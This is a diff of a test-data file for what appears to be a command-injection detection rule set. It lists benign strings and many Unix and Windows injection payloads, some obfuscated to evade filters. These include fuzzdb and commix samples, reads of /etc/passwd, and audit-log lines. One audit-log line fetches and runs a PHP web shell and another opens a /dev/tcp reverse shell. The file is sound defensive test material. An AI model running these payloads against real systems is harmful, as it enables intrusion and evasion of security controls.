@@ -1,15 +1,16 @@
 # should not be positive
-ceci n'est pas un wget so this shouldn't match 1
-curling & wgetting are fun so this shouldn't match 2
-{idiots} && ccnumbers || nicely; formatted strings should not match 3
-Unix ;Bash is case-sensitive and should not match 4
-Some {cats are} missing a word boundary and should not match 5
-wgettery is not rce and should not match 6
+ceci n'est pas un wget so this shouldn't match (1)
+curling & wgetting are fun so this shouldn't match (2)
+{idiots} && ccnumbers || nicely; formatted strings should not match (3)
+Unix ;Bash is case-sensitive and should not match (4)
+Some {cats are} missing a word boundary and should not match (5)
+wgettery is not rce and should not match (6)
 ;.
+;. 
 ls
-1 &gt; .999... 9
-\r\n..and this is exactly what modern day GCC is capable of doing 10
-; ..most are fine and everything below should be blocked 11
+1 &gt; .999... (10)
+\r\n..and this is exactly what modern day GCC is capable of doing (11)
+; ..most are fine and everything below should be blocked (12)
 
 # command injection (unix)
 ;cat index.php
@@ -38,7 +39,8 @@ foo $(( 'lsmod' ...))
 foo ${ ftp }
 foo <( lftp blah )
 foo >( "lftp" foo )
-foo `lftp ...`
+foo `lftp ftp.nluug.nl`
+foo `lftp ftp://ftp.nluug.nl`
 foo ` /usr/bin/'adduser' ...`
 foo;FOO=BAR adduser
 foo;FOO=BAR BAZ=QUX adduser
@@ -116,8 +118,8 @@ foo;/usr/local/bin/curl
 foo;'/usr/local/bin/curl'
 foo;"/usr/local/bin/curl"
 foo;/usr/./local/bin/bash
-foo;/usr/\./local\/bi\n/ba\sh
-foo;/usr/./local//bin/bash
+foo;/usr/\./local\/b\in/ba\sh
+foo;/usr/./local//bin/bas\h
 foo;/./usr/./local/./bin/bash
 foo;././usr/./local/./bin/bash
 
@@ -148,7 +150,7 @@ foo ;'l''s''o''f' ...
 foo ; 'l'"s"of ...
 foo ; 'l'"s"\o\f ...
 foo ; 'c'"h"\m\od ...
-foo ; 'm'"k"\d\ir ...
+foo ; 'm'"k"\d\ir ./foo
 foo ; 'c'"h""m"'o'd ...
 foo ; "c""h""m""o"d ...
 
@@ -164,7 +166,7 @@ foo ;"mkd"\i''r foo
 foo ;''m''k''di''r'' foo
 foo ;''''''''""n""e''tc""a""""""""""t foo
 foo ;n"etc"at foo
-foo ;m"ou"n\t /
+foo ;m"ou"n\t /vol
 foo ;"netcat" foo
 foo ;"n"e't'cat foo
 foo ;bsdtar
@@ -255,9 +257,31 @@ foo ; lw\p-download foox
 ;while (1)\n ls\n end
 
 # command injection (Windows)
-|dir
+|dir c:\
+# false negative:
+#|dir \
 |dir/a
 |dir /a
+|dir,/a
+|dir,/a c:\
+|dir,c:\
+|@di^r,c:\
+|echo/lala
+|echo^/lala
+|type file.txt
+|more/p file.txt
+|more/p< file.txt
+|more/p < file.txt
+|MORE.com/p file.txt
+|MORE.COM/p < file.txt
+|MORE.c^o^m/p file.txt
+|"more"<file.txt
+|"more" <file.txt
+|type,hey.txt
+|type;hey.txt
+|(type hey.txt)
+|(type,hey.txt)
+|(type;hey.txt)
 foo |cmd
 foo |attrib ...
 foo | attrib ...
@@ -386,7 +410,7 @@ foo `wget http://blah`;
 v;wget http://example.com/foo|
 Doc1.pdf | Dir c:\
 ;cat pass
-a;"/bin/m"kd"ir"
+a;"/bin/m"kd"ir" foo
 foo;cat <('l''s')
 
 # commix - unix payloads
@@ -414,72 +438,72 @@ foo;cat <('l''s')
 -In^putFor^mat none Sta^rt-Sl^eep -s 2
 -In^putFor^mat none sta^rt-sl^eep -s 2
 
-# fuzzdb
-/index.html|id|
-;id;
-;id
+# adapted for fuzzdb (we don't detect 'id' without parameters b/c FP)
+/index.html|ls|
+;ls;
+;ls
 ;netstat -a;
-;id;
-|id
-|/usr/bin/id
-|id|
-|/usr/bin/id|
-||/usr/bin/id|
-|id;
-||/usr/bin/id;
-;id|
-;|/usr/bin/id|
+;ls;
+|ls
+|/bin/ls
+|ls|
+|/bin/ls|
+||/bin/ls|
+|ls;
+||/bin/ls;
+;ls|
+;|/bin/ls|
 \n/bin/ls -al\n
-\n/usr/bin/id\n
-\nid\n
-\n/usr/bin/id;
-\nid;
-\n/usr/bin/id|
-\nid|
-;/usr/bin/id\n
-;id\n
-|usr/bin/id\n
-`id`
-`/usr/bin/id`
-a);id
-a;id
-a);id;
-a;id;
-a);id|
-a;id|
-a)|id
-a|id
-a)|id;
-a|id
+\n/bin/ls\n
+\nls\n
+\n/bin/ls;
+\nls;
+\n/bin/ls|
+\nls|
+;/bin/ls\n
+;ls\n
+|usr/bin/ls\n
+`ls`
+`/bin/ls`
+a);ls
+a;ls
+a);ls;
+a;ls;
+a);ls|
+a;ls|
+a)|ls
+a|ls
+a)|ls;
+a|ls
 |/bin/ls -al
-a);/usr/bin/id
-a;/usr/bin/id
-a);/usr/bin/id;
-a;/usr/bin/id;
-a);/usr/bin/id|
-a;/usr/bin/id|
-a)|/usr/bin/id
-a|/usr/bin/id
-a)|/usr/bin/id;
-a|/usr/bin/id
+a);/bin/ls
+a;/bin/ls
+a);/bin/ls;
+a;/bin/ls;
+a);/bin/ls|
+a;/bin/ls|
+a)|/bin/ls
+a|/bin/ls
+a)|/bin/ls;
+a|/bin/ls
 ;system('cat /etc/passwd')
-;system('id')
-;system('/usr/bin/id')
+;system('ls')
+;system('/bin/ls')
 \ncat /etc/passwd
-\n/usr/bin/id
-\nid
-\n/usr/bin/id\n
-\nid\n
+\n/bin/ls
+\nls
+\n/bin/ls\n
+\nls\n
 & ping -i 30 127.0.0.1 &
 & ping -n 30 127.0.0.1 &
 \r ping -i 30 127.0.0.1 \n
 `ping 127.0.0.1`
-| id
-& id
-; id
-\n id \n
-`id`
-$;/usr/bin/id
+| ls
+& ls
+; ls
+\n ls \n
+`ls`
+$;/bin/ls
 
 # from audit logs
 ;wget http://192.168.1.43/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php
@@ -667,12 +691,40 @@ ls /
 echo RVSPSL>/tmp/RVSPSL.txt
 echo FYVZVP > /tmp/FYVZVP.txt
 cat /tmp/FYVZVP.txt
+cat </tmp/FYVZVP.txt
+cat</tmp/FYVZVP.txt
+cat</tmp/FYVZVP.txt>output.html
 perl doc.txt
 setsid /bin/bash -i >/dev/tcp/192.168.30.7/443 0<&1 2>&1
 
-# diff
+# diff FP, require whitespace
+;diff 1 2
+;diff -ru . ../
+;diff ./a.txt ./b.txt
 ;diff /dev/null passwords.txt
 ;'diff' /dev/null passwords.txt
 ;"diff" /dev/null passwords.txt
 ;\d\i\f\f /dev/null passwords.txt
 ;diff^ a.txt b.txt
+;cat<index.txt
+;cat <index.txt
+;cat>outfile.txt<infile.txt
+;cat >outfile.txt < infile.txt
+;file a.txt
+|vol c:
+|vol,c:
+|vol;c:
+|more foo
+|more,foo
+|more;foo
+|more.com foo
+|more.com/e foo
+|more.c^om/e foo
+|more/e foo
+|more^/e foo
+|"more"^/e foo
+|more< foo
+|more < foo
+|more>foo
+|m^ore>foo
+|more> foo
